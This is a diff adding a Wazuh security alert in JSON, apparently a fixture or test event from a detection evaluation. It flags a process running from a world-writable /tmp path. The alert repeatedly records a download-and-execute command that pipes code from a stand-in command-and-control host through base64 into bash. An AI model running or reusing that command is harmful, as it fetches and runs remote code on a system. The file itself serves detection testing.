@@ -1,0 +1,63 @@
+{
+  "agent": {
+    "ip": "172.19.0.8",
+    "name": "attack-endpoint",
+    "id": "009"
+  },
+  "manager": {
+    "name": "wazuh.manager"
+  },
+  "data": {
+    "vigix": {
+      "event_type": "suspicious_process"
+    },
+    "file": "/tmp/.cache/kworkerd",
+    "sha256": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
+    "audit": {
+      "parent": "tail",
+      "uid": "33",
+      "exe": "/tmp/.cache/kworkerd",
+      "pid": "1450",
+      "user": "www-data",
+      "command": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+      "ppid": "1"
+    },
+    "agent_host": "attack-endpoint",
+    "message": "process /tmp/.cache/kworkerd (pid 1450, ppid 1 tail, user www-data, sha256 c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64) running from a world-writable path; parent shell command: curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+    "command": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": false,
+    "level": 10,
+    "description": "VIGIX-EVAL: suspicious process executed from a world-writable path",
+    "groups": [
+      "vigix_eval",
+      "process_execution",
+      "vigix_eval",
+      "vigix_custom"
+    ],
+    "mitre": {
+      "technique": [
+        "Unix Shell"
+      ],
+      "id": [
+        "T1059.004"
+      ],
+      "tactic": [
+        "Execution"
+      ]
+    },
+    "id": "100330"
+  },
+  "decoder": {
+    "name": "json"
+  },
+  "full_log": "{\"vigix\":{\"event_type\":\"suspicious_process\"},\"audit\":{\"exe\":\"/tmp/.cache/kworkerd\",\"command\":\"curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash\",\"ppid\":1,\"parent\":\"tail\",\"uid\":\"33\",\"user\":\"www-data\",\"pid\":1450},\"command\":\"curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash\",\"file\":\"/tmp/.cache/kworkerd\",\"sha256\":\"c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64\",\"agent_host\":\"attack-endpoint\",\"message\":\"process /tmp/.cache/kworkerd (pid 1450, ppid 1 tail, user www-data, sha256 c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64) running from a world-writable path; parent shell command: curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash\"}",
+  "input": {
+    "type": "log"
+  },
+  "location": "/var/log/vigix-eval/events.json",
+  "id": "1790000000.910008",
+  "timestamp": "2026-10-03T11:59:08.106+0000"
+}
